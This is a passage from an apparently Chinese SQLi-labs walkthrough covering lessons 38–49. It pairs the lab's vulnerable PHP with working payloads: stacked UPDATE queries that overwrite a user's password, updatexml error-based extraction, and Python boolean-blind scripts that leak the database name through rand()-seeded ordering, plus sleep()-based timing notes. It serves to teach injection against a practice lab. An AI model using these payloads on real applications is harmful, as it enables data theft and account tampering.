<span class="token function">mysqli_multi_query</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">do</span> <span class="token punctuation">{</span>
    <span class="token comment">/* store the result set in PHP */</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_store_result</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_row</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%s\n"</span><span class="token punctuation">,</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token comment">/* print divider */</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_more_results</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"-----------------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">mysqli_next_result</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
</code></pre></div><p class="x-p">当堆叠注入漏洞存在时，我们能够在注入点后追加任意SQL语句而不受限于原有查询的结构，从而实现更强大的功能。</p><p class="x-p">这一部分的Lab我们以修改<code class="x-inline-highlight">Dumb</code>用户（<code class="x-inline-highlight">id=1</code>）的密码作为目标，也就是执行如下SQL语句：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">SQL</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">UPDATE</span> security<span class="token punctuation">.</span>users <span class="token keyword">SET</span> password<span class="token operator">=</span><span class="token string">'hacked'</span> <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token string">'1'</span><span class="token punctuation">;</span></code></pre></div><h3 class="x-h2">L38-L41</h3><p class="x-p">四个Lab只有闭合方式不同。</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>payload <span class="token operator">=</span> <span class="token string">"?id=1';  UPDATE security.users SET password='hacked-L38' WHERE id='1'; -- "</span>
payload <span class="token operator">=</span> <span class="token string">"?id=1;   UPDATE security.users SET password='hacked-L39' WHERE id='1'; -- "</span>
payload <span class="token operator">=</span> <span class="token string">"?id=1'); UPDATE security.users SET password='hacked-L40' WHERE id='1'; -- "</span>
payload <span class="token operator">=</span> <span class="token string">"?id=1;   UPDATE security.users SET password='hacked-L41' WHERE id='1'; -- "</span>
</code></pre></div><h3 class="x-h2">L42-L45</h3><p class="x-p">L44和L45分别是L42和L43的盲注版本。</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>payload <span class="token operator">=</span> <span class="token string">"x'; UPDATE security.users SET password='hacked-L42' WHERE id='1'; -- "</span>
resp <span class="token operator">=</span> query_post<span class="token punctuation">(</span><span class="token string">"Less-42/login.php"</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"login_user"</span><span class="token punctuation">:</span> <span class="token string">"x"</span><span class="token punctuation">,</span> <span class="token string">"login_password"</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>payload <span class="token operator">=</span> <span class="token string">"x'); UPDATE security.users SET password='hacked-L43' WHERE id='1'; -- "</span>
resp <span class="token operator">=</span> query_post<span class="token punctuation">(</span><span class="token string">"Less-43/login.php"</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"login_user"</span><span class="token punctuation">:</span> <span class="token string">"x"</span><span class="token punctuation">,</span> <span class="token string">"login_password"</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>payload <span class="token operator">=</span> <span class="token string">"x'; UPDATE security.users SET password='hacked-L44' WHERE id='1'; -- "</span>
resp <span class="token operator">=</span> query_post<span class="token punctuation">(</span><span class="token string">"Less-44/login.php"</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"login_user"</span><span class="token punctuation">:</span> <span class="token string">"x"</span><span class="token punctuation">,</span> <span class="token string">"login_password"</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>payload <span class="token operator">=</span> <span class="token string">"x'); UPDATE security.users SET password='hacked-L45' WHERE id='1'; -- "</span>
resp <span class="token operator">=</span> query_post<span class="token punctuation">(</span><span class="token string">"Less-45/login.php"</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"login_user"</span><span class="token punctuation">:</span> <span class="token string">"x"</span><span class="token punctuation">,</span> <span class="token string">"login_password"</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><h2 class="x-h1">ORDER BY注入：L46-L53</h2><h3 class="x-h2">前言 &amp; 笔记</h3><p class="x-p"><code class="x-inline-highlight">ORDER BY</code>的正常使用：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">SQL</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment">-- 按照第2列排序（默认升序）</span>
<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">-- 随机排序</span>
<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> username<span class="token punctuation">;</span> <span class="token comment">-- 按照用户名排序（默认升序）</span>
<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> username <span class="token keyword">ASC</span><span class="token punctuation">,</span> id <span class="token keyword">DESC</span><span class="token punctuation">;</span> <span class="token comment">-- 先按用户名升序排序，再按ID降序排序</span>
</code></pre></div><h4 class="x-h3">注入思路1：布尔盲注</h4><p class="x-p">这里的盲注不一定是看不到回显，而是无法通过注入直接获取数据，只能通过不同的排序行为来泄露一比特的条件信息。</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">SQL</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> <span class="token keyword">if</span><span class="token punctuation">(</span>cond<span class="token punctuation">,</span> id<span class="token punctuation">,</span> username<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> rand<span class="token punctuation">(</span>cond<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p class="x-p"><code class="x-inline-highlight">ORDER BY rand()</code>实现随机排序的原理是每一行都会调用<code class="x-inline-highlight">rand()</code>生成一个随机数，然后根据这个随机数排序。</p><p class="x-p">MySQL的<code class="x-inline-highlight">rand()</code>函数可以接受一个整数参数作为种子值，当传入相同的种子值时，<code class="x-inline-highlight">rand(seed)</code>会生成相同的随机数序列，因此一个<code class="x-inline-highlight">cond</code>条件的真假会影响排序结果，相当于设置了种子值为<code class="x-inline-highlight">0</code>或<code class="x-inline-highlight">1</code>。</p><h4 class="x-h3">注入思路2：时间盲注</h4><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">SQL</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> <span class="token string">'...'</span><span class="token punctuation">,</span> sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> <span class="token string">'...'</span> <span class="token operator">OR</span> sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><div class="x-highlightblock highlight-background-golden"><p class="x-p">语句<code class="x-inline-highlight">SELECT * FROM users ORDER BY '...' OR sleep(1);</code>实际上是<code class="x-inline-highlight">ORDER BY</code>逻辑表达式<code class="x-inline-highlight">'...' OR sleep(1)</code>的值，语句的实际意义不大。</p></div><div class="x-highlightblock highlight-background-golden"><p class="x-p"><code class="x-inline-highlight">ORDER BY sleep(1)</code>函数会对每一行调用<code class="x-inline-highlight">sleep(1)</code>，假设有<code class="x-inline-highlight">N</code>行数据，那么整个查询会延时<code class="x-inline-highlight">N</code>秒。</p></div><h4 class="x-h3">注入思路3：报错盲注</h4><p class="x-p">如果服务端开启了报错回显，注入思路和报错注入是一样的。</p><h3 class="x-h2">L46</h3><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">PHP</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token variable">$sort</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sort'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users ORDER BY <span class="token interpolation"><span class="token variable">$sort</span></span>"</span><span class="token punctuation">;</span>
</code></pre></div><p class="x-p">报错注入：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>payload <span class="token operator">=</span> <span class="token string">"?sort=updatexml(null,concat(0x7e,(SELECT database()),0x7e),null) -- "</span></code></pre></div><img alt="img" loading="lazy" width="1833" height="265" decoding="async" data-nimg="1" class="x-image" style="color:transparent;width:100%;height:auto" src="/_next/static/media/L46.6326cbe6.jpg"/><h3 class="x-h2">L47</h3><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">PHP</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token variable">$sort</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sort'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users ORDER BY '<span class="token interpolation"><span class="token variable">$sort</span></span>'"</span><span class="token punctuation">;</span>
</code></pre></div><p class="x-p">报错注入：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>payload <span class="token operator">=</span> <span class="token string">"?sort=x' OR updatexml(null,concat(0x7e,(SELECT database()),0x7e),null) -- "</span></code></pre></div><h3 class="x-h2">L48</h3><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">PHP</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token variable">$sort</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sort'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users ORDER BY <span class="token interpolation"><span class="token variable">$sort</span></span>"</span><span class="token punctuation">;</span>
</code></pre></div><p class="x-p">报错回显被关闭了，考虑使用布尔盲注：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>payload <span class="token operator">=</span> <span class="token string">"?sort=rand(substr(database(),1,1)='!') -- "</span>
resp <span class="token operator">=</span> query_get<span class="token punctuation">(</span><span class="token string">"Less-48"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
hash_false <span class="token operator">=</span> sha256<span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    resp <span class="token operator">=</span> query_get<span class="token punctuation">(</span><span class="token string">"Less-48"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
    hash_resp <span class="token operator">=</span> sha256<span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token string">":"</span><span class="token punctuation">,</span> hash_resp <span class="token operator">!=</span> hash_false<span class="token punctuation">)</span>


test<span class="token punctuation">(</span><span class="token string">"?sort=rand(substr(database(),1,1)='?') -- "</span><span class="token punctuation">)</span>  <span class="token comment"># False</span>
test<span class="token punctuation">(</span><span class="token string">"?sort=rand(substr(database(),1,1)='s') -- "</span><span class="token punctuation">)</span>  <span class="token comment"># True</span>
test<span class="token punctuation">(</span><span class="token string">"?sort=rand(substr(database(),2,1)='e') -- "</span><span class="token punctuation">)</span>  <span class="token comment"># True</span>
test<span class="token punctuation">(</span><span class="token string">"?sort=rand(substr(database(),3,1)='c') -- "</span><span class="token punctuation">)</span>  <span class="token comment"># True</span>
</code></pre></div><h3 class="x-h2">L49</h3><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">PHP</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token variable">$sort</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sort'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users ORDER BY '<span class="token interpolation"><span class="token variable">$sort</span></span>'"</span><span class="token punctuation">;</span>
</code></pre></div><p class="x-p">布尔盲注仍然可用：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>payload <span class="token operator">=</span> <span class="token string">"?sort=x' OR rand(999) &lt; rand(substr(database(),1,1)='!') -- "</span>
resp <span class="token operator">=</span> query_get<span class="token punctuation">(</span><span class="token string">"Less-49"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
hash_false <span class="token operator">=</span> sha256<span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    resp <span class="token operator">=</span> query_get<span class="token punctuation">(</span><span class="token string">"Less-49"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
    hash_resp <span class="token operator">=</span> sha256<span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token string">":"</span><span class="token punctuation">,</span> hash_resp <span class="token operator">!=</span> hash_false<span class="token punctuation">)</span>


test<span class="token punctuation">(</span><span class="token string">"?sort=x' OR rand(999) &lt; rand(substr(database(),1,1)='?') -- "</span><span class="token punctuation">)</span>  <span class="token comment"># False</span>
test<span class="token punctuation">(</span><span class="token string">"?sort=x' OR rand(999) &lt; rand(substr(database(),1,1)='s') -- "</span><span class="token punctuation">)</span>  <span class="token comment"># True</span>
test<span class="token punctuation">(</span><span class="token string">"?sort=x' OR rand(999) &lt; rand(substr(database(),2,1)='e') -- "</span><span class="token punctuation">)</span>  <span class="token comment"># True</span>
test<span class="token punctuation">(</span><span class="token string">"?sort=x' OR rand(999) &lt; rand(substr(database(),3,1)='c') -- "</span><span class="token punctuation">)</span>  <span class="token comment"># True</span>
</code></pre></div><p class="x-p">原理是，由于服务端传入的<code class="x-inline-highlight">sort</code>参数被单引号包裹，闭合后形成<code class="x-inline-highlight">ORDER BY 'x' OR rand(999) &#60; rand(...)</code>，也就是根据逻辑表达式<code class="x-inline-highlight">'x' OR rand(999) &#60; rand(...)</code>的值进行排序。</p><p class="x-p">字符串<code class="x-inline-highlight">'x'</code>在MySQL中被转换为整数<code class="x-inline-highlight">0</code>（因为不是以数字开头），因此逻辑关系用<code class="x-inline-highlight">OR</code>来确保后面的表达式<code class="x-inline-highlight">rand(999) &#60; rand(...)</code>被计算；当条件分别为真或假时，相当于计算<code class="x-inline-highlight">rand(999) &#60; rand(0)</code>或<code class="x-inline-highlight">rand(999) &#60; rand(1)</code>。这里<code class="x-inline-highlight">999</code>可随意填写。</p><p class="x-p"><code class="x-inline-highlight">rand(0)</code>、<code class="x-inline-highlight">rand(1)</code>、<code class="x-inline-highlight">rand(999)</code>由于固定了种子，生成的序列都是确定的，因此最后的排序结果是稳定的；而序列<code class="x-inline-highlight">rand(0)</code>、<code class="x-inline-highlight">rand(1)</code>不同，导致最终结果行的顺序不同，从而可以用于判断条件是否成立。</p><h4 class="x-h3">时间盲注</h4><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 